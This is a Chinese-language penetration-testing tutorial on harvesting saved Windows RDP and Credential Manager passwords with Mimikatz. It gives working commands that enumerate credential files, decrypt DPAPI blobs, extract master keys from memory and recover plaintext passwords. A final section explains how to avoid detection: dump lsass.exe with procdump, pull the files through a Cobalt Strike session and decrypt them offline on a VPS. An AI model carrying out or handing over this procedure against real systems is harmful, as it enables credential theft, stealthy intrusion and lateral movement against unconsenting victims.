### Mimikatz 抓取 Windows RDP 凭证

[下载工具](https://github.com/Heart-Sky/ListRDPConnections/releases?utm_source=chatgpt.com)

![](https://pic1.imgdb.cn/item/68cc6c76c5157e1a8817f826.png)

**查看 mstsc 的连接记录**

```cmd
cmdkey /list
```

![](https://pic1.imgdb.cn/item/68cc5dadc5157e1a8817f038.png)

**查找本地的 Credentials , 注意实战中排查每个用户的这个目录**

```cmd
dir /a C:\Users\用户名\AppData\Local\Microsoft\Credentials\*
```

**路径**：`C:\Users\用户名\AppData\Local\Microsoft\Credentials\*`
 这个目录是 **Windows 凭据管理器 (Credential Manager)** 存放用户凭据的本地文件位置

![](https://pic1.imgdb.cn/item/68cc5df7c5157e1a8817f053.png)

每个文件名（如 `2940EFA7AD286DAC05F285B1F8956197`）是凭据项的 **GUID 哈希形式的标识符**

文件大小（2KB ~ 11KB）代表保存的加密数据长度

**加密方式**：Windows 使用 **DPAPI (Data Protection API)** 加密这些文件，绑定到用户的 SID 和登录凭据（主密钥保存在 `Protect` 文件夹下）

只有在用户上下文（或获取用户的 Windows 登录凭据/主密钥）时才能解密

```cmd
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
```

`%userprofile%`：环境变量，会被展开为当前用户个人文件夹路径，例如 `C:\Users\ydd33`

![](https://pic1.imgdb.cn/item/68cc5e57c5157e1a8817f078.png)

选择加密文件，使用 mimikatz 对其文件进行解密，并记录下 **guidMasterKey** 的值和 **pbDat**

```cmd
mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\ydd33\AppData\Local\Microsoft\Credentials\2940EFA7AD286DAC05F285B1F8956197" exit
```

`"privilege::debug"`
 请求并启用 `SeDebugPrivilege` 权限（等同于赋予当前进程调试/访问其他进程的高级权限）。

- 目的：让 Mimikatz 能够访问系统级资源和其它进程（例如 `lsass`）所持有的敏感凭据。
- 要求：通常需要 **管理员权限**；若想访问 SYSTEM 级别信息，需以 SYSTEM 或等价权限运行。

`"dpapi::cred /in:C:\Users\ydd33\AppData\Local\Microsoft\Credentials\2940EFA7AD286DAC05F285B1F8956197"`
 使用 Mimikatz 的 **DPAPI 模块**（`dpapi::cred`）去解析/解密一个存放在磁盘上的 **Credential Manager（Credentials 目录）** 文件

- `/in:<path>`：指定要解析的输入文件
- 模块工作方式（高层说明）：尝试解析该二进制凭据容器，识别 DPAPI 加密 blob，并**使用可用的 DPAPI 主密钥或会话凭据**去解密出明文凭据（若能找到解密密钥）

`exit`
 运行完上述命令后退出 mimikatz

![](https://pic1.imgdb.cn/item/68cc635dc5157e1a8817f29c.png)

`dwVersion : 00000001 - 1`
Blob 的版本号（DPAPI/Cred blob 版本）。表示该结构使用第 1 版格式

`guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}`
指示使用的提供者/格式的 GUID（与 Windows DPAPI/加密实现相关的标识符）。通常表明这个 blob 遵循哪种 DPAPI 提供者/实现

`dwMasterKeyVersion : 00000001 - 1`
主密钥版本号（master key 的版本），用于匹配 master key 的版本（master key 文件里也会有对应版本）

`guidMasterKey : {5d12b634-3f68-4c43-b2ea-1dfd7cc35def}`
**关键**：指向用于加密该 blob 的 DPAPI master key 的 GUID（ID）。要解密这个 blob，通常需要对应 GUID 的 masterkey 文件（位于 `%appdata%\Microsoft\Protect\<SID>\{guid}` 或者机器/域级 Protect 目录），或能解密该 master key 的用户/机器凭证

`dwFlags : 20000000 - 536870912 (system ; )`
标志位集合。`0x20000000` 在 mimikatz 输出中被标注为 `system`，意味着该凭据是“系统/机器相关”的（即与机器或 SYSTEM 作用域有关，而不是纯属可漫游的用户凭据）。这会影响解密所需的上下文——例如可能需要机器级的 DPAPI key 或 SYSTEM 权限

`dwDescriptionLen : 00000012 - 18`
描述字符串的长度（字节数），接下来 `szDescription` 就是该长度的文本

`szDescription : 本地凭据数据`
描述字段（UTF-8/Unicode 文本），说明了这个 blob 的用途或来源（这里写着“本地凭据数据”）

`algCrypt : 00006610 - 26128 (CALG_AES_256)`
用于对数据实际加密的对称算法标识。`CALG_AES_256` 表明使用 AES-256（通常是 AES-CBC 或 AES-GCM，具体取决于实现/版本；常见为 AES-CBC + PKCS#7 填充）

`dwAlgCryptLen : 00000100 - 256`
加密算法的密钥长度（通常是位数或字节数语义混用）；这里 `256` 对应 AES-256 的 key 长度（bits）

`dwSaltLen : 00000020 - 32`
salt（盐）的长度（字节数）——32 字节盐用于派生密钥

`pbSalt : a8f2b2...`
salt 的十六进制值。用于从 master key /密码 派生出真正的加密密钥和/或 HMAC key（即 key derivation 的输入之一）

`dwHmacKeyLen : 00000000 - 0` & `pbHmackKey :`
这里显示主 HMAC key 长度为 0，且没有直接保存 `pbHmackKey`。某些 DPAPI 版本会有不同的 HMAC key 字段布局；实际 HMAC 密钥可能通过其它派生步骤产生，而不会原样放在 blob 中

`algHash : 0000800e - 32782 (CALG_SHA_512)`
哈希/派生函数使用的算法，`CALG_SHA_512` 表明使用 SHA-512 作为 KDF/HMAC 的散列函数（或用于 HMAC-SHA512）

`dwAlgHashLen : 00000200 - 512`
表示哈希位长（512 位 → SHA-512）

`dwHmac2KeyLen : 00000020 - 32`
第二个 HMAC key 的长度为 32 字节

`pbHmack2Key : 271d62...`
blob 中保存的用于第二阶段 HMAC/签名验证的键或相关数据

`dwDataLen : 000007c0 - 1984`
`pbData` 的长度（字节数）

`pbData : dd520d447d...`
被加密的主体数据（以十六进制显示）

`dwSignLen : 00000040 - 64`
签名或 MAC 的长度（字节数）

`pbSign : beb2f68d16...`
签名/MAC 的十六进制值。该值用于验证 `pbData` 的完整性，通常在解密前/后校验以保证未被篡改

通过 guidMasterKey 值找到内存中对应的 MasterKey

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" exit
```

`"sekurlsa::dpapi"`
 调用 Mimikatz 的 `sekurlsa` 子模块里的 `dpapi` 功能。`sekurlsa::dpapi` 专门寻找并导出 DPAPI 相关的密钥材料（例如与用户/机器 DPAPI masterkey 相关的内存结构、会话 key、解密所需的中间值等）

![](https://pic1.imgdb.cn/item/68cc6859c5157e1a8817f5b9.png)

最后解密

```
mimikatz.exe "privilege::debug" "dpapi::cred
/in:C:\Users\administrator\AppData\Local\Microsoft\Credentials\C2BE282F4A2C7A8AABA1E0
4728DC75A4
/masterkey:38c1288b5a8e690bc4258060e1bd1003e89f6c919468e780cc309f32f797c2e55d70d
2a45868676dafd61d04539900473a1f949f2243ffca06e1fae948bde25b" exit

mimikatz.exe "privilege::debug" "dpapi::cred /in:08D551D26DE48F42F19D482AE153A7D0
/masterkey:cef92a9f71a2826b0dbc93248b473cec8906176a9cdb97e9717c11c6855a8b2edf777
29b41c8970436b702a8199aeb65dbb1ab4cdf26105a12f4ac287575995e" exit
```

![](https://pic1.imgdb.cn/item/68cc698fc5157e1a8817f74f.png)

**由于我们不能保证我们的 mimikatz 是免杀状态，为了避免被对方发现，我们可以离线解密从而达到获取密码的目的其实很简单，就是把目标的文件和内存下载回来，在 VPS 或本机上进行 mimikatz 解密即可**

dump 目标的 lsass.exe 内存

```cmd
procdump.exe ‐accepteula ‐ma lsass.exe lsass1.dump
```

上线 CS, 下载目标的 Credentials 文件

```cmd
C:\Users\Administrator\AppData\Local\Microsoft\Credentials
```

用 mimikatz 载入 dump 回来的内存

```cmd
Sekurlsa::minidump lsass1.dump
```

获取 Credentials 的 GUID

```cmd
dpapi::cred /in:5CF098107895D40EC0A0FC47FB5BB7C7
```

获取内存中所有的 MasterKey

```cmd
sekurlsa::dpapi
```

利用 MasterKey 解密

```cmd
dpapi::cred
/in:5CF098107895D40EC0A0FC47FB5BB7C7
/masterkey:6b6ddf293f178cb282c2906c69d92226c137cca320aa6db2043708bc2755eba6cdd8f
aa89ef7dd656597da5346ecbb66aa57108247555e13caac0ff09ce2e1c6
```
